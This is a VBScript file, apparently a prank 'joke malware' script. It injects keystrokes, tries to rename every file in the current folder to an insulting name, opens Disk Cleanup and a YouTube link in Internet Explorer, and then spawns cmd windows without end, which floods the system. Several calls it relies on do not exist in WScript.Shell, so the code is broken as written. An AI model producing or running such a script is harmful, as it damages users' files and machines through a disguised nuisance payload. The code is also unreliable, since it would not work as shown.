Set wshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

MsgBox "Warning: This script was made by EngineerDog. Use at your own risk!", vbExclamation, "Attention"

Dim screenBounds
screenBounds = wshShell.Screen.Bounds

Do
    If wshShell.CursorLeft <= screenBounds.Left Or wshShell.CursorLeft >= screenBounds.Right Or wshShell.CursorTop <= screenBounds.Top Or wshShell.CursorTop >= screenBounds.Bottom Then
        wshShell.SendKeys "^{ESC}"
        wshShell.Run "cmd /c mode con:cols=15 lines=5"
        
        For Each file In fso.GetFolder(".").Files
            file.Name = "YOUASKEDFORTHIS.DUMBASS"
        Next
        
        wshShell.Run "cleanmgr.exe"
        wshShell.Run "iexplore.exe https://www.youtube.com/watch?v=YQhprWbyQD8"
        wshShell.Run "iexplore.exe"
        
        Do
            wshShell.Run "cmd /c echo whopper whopper whopper junior triple mega whopper & echo."
            WScript.Sleep 100
        Loop
    End If

    wshShell.SendKeys "{UP}"
    WScript.Sleep 50
    wshShell.SendKeys "{DOWN}"
    WScript.Sleep 50
    wshShell.SendKeys "{LEFT}"
    WScript.Sleep 50
    wshShell.SendKeys "{RIGHT}"
    WScript.Sleep 50
Loop